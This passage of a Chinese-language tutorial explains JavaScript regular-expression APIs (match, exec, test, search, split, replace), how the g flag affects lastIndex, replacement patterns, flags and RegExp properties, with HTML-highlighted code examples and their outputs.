"2017", "06", "26", index: 0, input: "2017-06-26"]</span>复制代码</code></pre><ul><li><code>exec</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})\D(\d{2})\D(\d{2})$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// =>["2017-06-26", "2017", "06", "26", index: 0, input: "2017-06-26"]</span>复制代码</code></pre><ul><li><code>test</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})\D(\d{2})\D(\d{2})$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span>regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">1</span><span class="token punctuation">,</span> RegExp<span class="token punctuation">.</span>$<span class="token number">2</span><span class="token punctuation">,</span> RegExp<span class="token punctuation">.</span>$<span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "2017" "06" "26"</span>复制代码</code></pre><ul><li><code>search</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})\D(\d{2})\D(\d{2})$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span>string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">1</span><span class="token punctuation">,</span> RegExp<span class="token punctuation">.</span>$<span class="token number">2</span><span class="token punctuation">,</span> RegExp<span class="token punctuation">.</span>$<span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "2017" "06" "26"</span>复制代码</code></pre><ul><li><code>replace</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})\D(\d{2})\D(\d{2})$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span><span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">,</span> year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span> <span class="token punctuation">{</span>    date<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "06", "26"]</span>复制代码</code></pre><p>其中，最常用的是<code>match</code>。</p><p><strong>1.4 替换</strong></p><p>找，往往不是目的，通常下一步是为了替换。在JS中，使用<code>replace</code>进行替换。</p><p>比如把日期格式，从yyyy-mm-dd替换成yyyy/mm/dd：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span><span class="token keyword">var</span> today <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/-/g</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> today <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => Mon Jun 26 2017 00:00:00 GMT+0800 (中国标准时间)</span>复制代码</code></pre><p>这里只是简单地应用了一下<code>replace</code>。但，<code>replace</code>方法是强大的，是需要重点掌握的。</p><h3 id="2-相关API注意要点"><a href="#2-相关API注意要点" class="headerlink" title="2. 相关API注意要点"></a>2. 相关API注意要点</h3><p>从上面可以看出用于正则操作的方法，共有6个，字符串实例4个，正则实例2个：</p><blockquote><p>String#search</p><p>String#split</p><p>String#match</p><p>String#replace</p><p>RegExp#test</p><p>RegExp#exec</p></blockquote><p>本文不打算详细地讲解它们的方方面面细节，具体可以参考《JavaScript权威指南》的第三部分。本文重点列出一些容易忽视的地方，以飨读者。</p><p><strong>2.1 search和match的参数问题</strong></p><p>我们知道字符串实例的那4个方法参数都支持正则和字符串。</p><p>但<code>search</code>和<code>match</code>，会把字符串转换为正则的。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017.06.27"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => 0</span><span class="token comment" spellcheck="true">//需要修改成下列形式之一</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">"\\."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex">/\./</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => 4</span><span class="token comment" spellcheck="true">// => 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2", index: 0, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">//需要修改成下列形式之一</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">"\\."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/\./</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => [".", index: 4, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">// => [".", index: 4, input: "2017.06.27"]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "06", "27"]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "2017/06.27"</span>复制代码</code></pre><p><strong>2.2 match返回结果的格式问题</strong></p><p><code>match</code>返回结果的格式，与正则对象是否有修饰符<code>g</code>有关。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017.06.27"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex1 <span class="token operator">=</span> <span class="token regex">/\b(\d+)\b/</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex2 <span class="token operator">=</span> <span class="token regex">/\b(\d+)\b/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "2017", index: 0, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">// => ["2017", "06", "27"]</span>复制代码</code></pre><p>没有<code>g</code>，返回的是标准匹配格式，即，数组的第一个元素是整体匹配的内容，接下来是分组捕获的内容，然后是整体匹配的第一个下标，最后是输入的目标字符串。</p><p>有<code>g</code>，返回的是所有匹配的内容。</p><p>当没有匹配时，不管有无<code>g</code>，都返回<code>null</code>。</p><p><strong>2.3 exec比match更强大</strong></p><p>当正则没有<code>g</code>时，使用<code>match</code>返回的信息比较多。但是有<code>g</code>后，就没有关键的信息<code>index</code>了。</p><p>而<code>exec</code>方法就能解决这个问题，它能接着上一次匹配后继续匹配：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017.06.27"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex2 <span class="token operator">=</span> <span class="token regex">/\b(\d+)\b/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex2<span class="token punctuation">.</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "2017", index: 0, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">// => 4</span><span class="token comment" spellcheck="true">// => ["06", "06", index: 5, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">// => 7</span><span class="token comment" spellcheck="true">// => ["27", "27", index: 8, input: "2017.06.27"]</span><span class="token comment" spellcheck="true">// => 10</span><span class="token comment" spellcheck="true">// => null</span><span class="token comment" spellcheck="true">// => 0</span>复制代码</code></pre><p>其中正则实例<code>lastIndex</code>属性，表示下一次匹配开始的位置。</p><p>比如第一次匹配了“2017”，开始下标是0，共4个字符，因此这次匹配结束的位置是3，下一次开始匹配的位置是4。</p><p>从上述代码看出，在使用<code>exec</code>时，经常需要配合使用<code>while</code>循环：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017.06.27"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex2 <span class="token operator">=</span> <span class="token regex">/\b(\d+)\b/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> result<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> result <span class="token operator">=</span> regex2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> result<span class="token punctuation">,</span> regex2<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// => ["2017", "2017", index: 0, input: "2017.06.27"] 4</span><span class="token comment" spellcheck="true">// => ["06", "06", index: 5, input: "2017.06.27"] 7</span><span class="token comment" spellcheck="true">// => ["27", "27", index: 8, input: "2017.06.27"] 10</span>复制代码</code></pre><p><strong>2.4 修饰符g，对exex和test的影响</strong></p><p>上面提到了正则实例的<code>lastIndex</code>属性，表示尝试匹配时，从字符串的<code>lastIndex</code>位开始去匹配。</p><p>字符串的四个方法，每次匹配时，都是从0开始的，即<code>lastIndex</code>属性始终不变。</p><p>而正则实例的两个方法<code>exec</code>、<code>test</code>，当正则是全局匹配时，每一次匹配完成后，都会修改<code>lastIndex</code>。下面让我们以<code>test</code>为例，看看你是否会迷糊：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/a/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"aba"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ababc"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true 1</span><span class="token comment" spellcheck="true">// => true 3</span><span class="token comment" spellcheck="true">// => false 0</span>复制代码</code></pre><p>注意上面代码中的第三次调用<code>test</code>，因为这一次尝试匹配，开始从下标<code>lastIndex</code>即3位置处开始查找，自然就找不到了。</p><p>如果没有<code>g</code>，自然都是从字符串第0个字符处开始尝试匹配：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/a/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"aba"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ababc"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>lastIndex <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true 0</span><span class="token comment" spellcheck="true">// => true 0</span><span class="token comment" spellcheck="true">// => true 0</span>复制代码</code></pre><p><strong>2.5 test整体匹配时需要使用^和$</strong></p><p>这个相对容易理解，因为<code>test</code>是看目标字符串中是否有子串匹配正则，即有部分匹配即可。</p><p>如果，要整体匹配，正则前后需要添加开头和结尾：</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token regex">/123/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"a123b"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token regex">/^123$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"a123b"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token regex">/^123$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p><strong>2.6 split相关注意事项</strong></p><p><code>split</code>方法看起来不起眼，但要注意的地方有两个的。</p><p>第一，它可以有第二个参数，表示结果数组的最大长度：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"html,css,javascript"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/,/</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// =>["html", "css"]</span>复制代码</code></pre><p>第二，正则使用分组时，结果数组中是包含分隔符的：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"html,css,javascript"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/(,)/</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// =>["html", ",", "css", ",", "javascript"]</span>复制代码</code></pre><p><strong>2.7 replace是很强大的</strong></p><p>《JavaScript权威指南》认为<code>exec</code>是这6个API中最强大的，而我始终认为<code>replace</code>才是最强大的。因为它也能拿到该拿到的信息，然后可以假借替换之名，做些其他事情。</p><p>总体来说<code>replace</code>有两种使用形式，这是因为它的第二个参数，可以是字符串，也可以是函数。</p><p>当第二个参数是字符串时，如下的字符有特殊的含义：</p><blockquote><p><code>$1</code>,<code>$2</code>,…,<code>$99</code>匹配第1~99个分组里捕获的文本<br><code>$&amp;</code> 匹配到的子串文本<br><code>$`</code> 匹配到的子串的左边文本<br><code>$&#39;</code> 匹配到的子串的右边文本<br><code>$$</code> 美元符号</p></blockquote><p>例如，把”2,3,5”，变成”5=2+3”：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"2,3,5"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\d+),(\d+),(\d+)/</span><span class="token punctuation">,</span> <span class="token string">"$3=$1+$2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "5=2+3"</span>复制代码</code></pre><p>又例如，把”2,3,5”，变成”222,333,555”:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"2,3,5"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\d+)/g</span><span class="token punctuation">,</span> <span class="token string">"$&amp;$&amp;$&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "222,333,555"</span>复制代码</code></pre><p>再例如，把”2+3=5”，变成”2+3=2+3=5=5”:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"2+3=5"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/=/</span><span class="token punctuation">,</span> <span class="token string">"$&amp;$`$&amp;$'$&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "2+3=2+3=5=5"</span>复制代码</code></pre><p>当第二个参数是函数时，我们需要注意该回调函数的参数具体是什么：</p><pre class=" language-js"><code class="language-js"><span class="token string">"1234 2345 3456"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\d)\d{2}(\d)/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">,</span> $<span class="token number">1</span><span class="token punctuation">,</span> $<span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span>match<span class="token punctuation">,</span> $<span class="token number">1</span><span class="token punctuation">,</span> $<span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> input<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["1234", "1", "4", 0, "1234 2345 3456"]</span><span class="token comment" spellcheck="true">// => ["2345", "2", "5", 5, "1234 2345 3456"]</span><span class="token comment" spellcheck="true">// => ["3456", "3", "6", 10, "1234 2345 3456"]</span>复制代码</code></pre><p>此时我们可以看到<code>replace</code>拿到的信息，并不比<code>exec</code>少。</p><p><strong>2.8 使用构造函数需要注意的问题</strong></p><p>一般不推荐使用构造函数生成正则，而应该优先使用字面量。因为用构造函数会多写很多<code>\</code>。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-27 2017.06.27 2017/06/27"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{4}(-|\.|\/)\d{2}\1\d{2}/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017-06-27", "2017.06.27", "2017/06/27"]</span>regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"\\d{4}(-|\\.|\\/)\\d{2}\\1\\d{2}"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017-06-27", "2017.06.27", "2017/06/27"]</span>复制代码</code></pre><p><strong>2.9 修饰符</strong></p><p>ES5中修饰符，共3个：</p><blockquote><p><code>g</code> 全局匹配，即找到所有匹配的，单词是global</p><p><code>i</code> 忽略字母大小写，单词ingoreCase</p><p><code>m</code> 多行匹配，只影响<code>^</code>和<code>$</code>，二者变成行的概念，即行开头和行结尾。单词是multiline</p></blockquote><p>当然正则对象也有相应的只读属性：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\w/img</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>global <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>ignoreCase <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>multiline <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p><strong>2.10 source属性</strong></p><p>正则实例对象属性，除了<code>global</code>、<code>ingnoreCase</code>、<code>multiline</code>、<code>lastIndex</code>属性之外，还有一个<code>source</code>属性。</p><p>它什么时候有用呢？</p><p>比如，在构建动态的正则表达式时，可以通过查看该属性，来确认构建出的正则到底是什么：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> className <span class="token operator">=</span> <span class="token string">"high"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"(^|\\s)"</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">"(\\s|$)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>source <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// => (^|\s)high(\s|$) 即字符串"(^|\\s)high(\\s|$)"</span>复制代码</code></pre><p><strong>2.11 构造函数属性</strong></p><p>构造函数的静态属性基于所执行的最近一次正则操作而变化。除了是<code>$1</code>,…,<code>$9</code>之外，还有几个不太常用的属性（有兼容性问题）：</p><blockquote><p><code>RegExp.input</code> 最近一次目标字符串，简写成<code>RegExp[&quot;$_&quot;]</code><br><code>RegExp.lastMatch</code> 最近一次匹配的文本，简写成<code>RegExp[&quot;$&amp;&quot;]</code><br><code>RegExp.lastParen</code> 最近一次捕获的文本，简写成<code>RegExp[&quot;$+&quot;]</code><br><code>RegExp.leftContext</code> 目标字符串中<code>lastMatch</code>之前的文本，简写成<code>RegExp[&quot;$</code>“]<code></code>RegExp.rightContext <code>目标字符串中</code>lastMatch<code>之后的文本，简写成</code>RegExp[“$’”]`</p></blockquote><p>测试代码如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/([abc])(\d)/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"a1b2c3d4e5"</span><span class="token punctuation">;</span>string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>input <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">[</span><span class="token string">"$_"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "a1b2c3d4e5"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>lastMatch <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">[</span><span class="token string">"$&amp;"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "c3"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>lastParen <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">[</span><span class="token string">"$+"</span><span class="token punctuation">]</span> <span class="token 